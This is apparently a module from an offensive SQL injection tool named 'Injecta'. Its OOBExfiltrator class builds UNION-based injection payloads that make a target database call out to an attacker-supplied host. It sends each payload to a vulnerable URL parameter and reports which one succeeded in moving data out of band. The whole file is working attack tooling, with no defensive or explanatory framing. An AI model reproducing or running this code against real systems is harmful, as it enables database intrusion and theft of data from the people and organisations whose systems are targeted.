"""
Injecta — Out-of-band (OOB) data exfiltration
"""
from typing import Any, Dict, Optional
from injecta.enum.extract import build_union_payload, extract_orig_val


class OOBExfiltrator:
    def __init__(self, requester, config, logger, payloads, injection_info: Dict[str, Any]):
        self.req = requester
        self.config = config
        self.log = logger
        self.payloads = payloads
        self.info = injection_info
        self.dbms = getattr(payloads, "name", "") if payloads else ""

    def _get_params(self, url: str, param: str):
        cols = self.info.get("column_count", 1) if self.info else 1
        pos = self.info.get("data_pos", 1) if self.info else 1
        orig_val = extract_orig_val(url, param)
        return cols, pos, orig_val

    def exfiltrate(self, url: str, param: str, target_host: str, data: str) -> Dict[str, any]:
        queries = self.payloads.oob_call(target_host, data)
        for q in queries:
            cols, pos, orig_val = self._get_params(url, param)
            payload = build_union_payload(q, cols, pos, dbms=self.dbms, orig_val=orig_val)
            try:
                status, _, elapsed = self.req.test_raw(url, payload, param)
                if status and elapsed:
                    return {"success": True, "method": q[:40], "response_time": elapsed, "data": data}
            except:
                continue
        return {"success": False, "error": "All OOB payloads failed"}
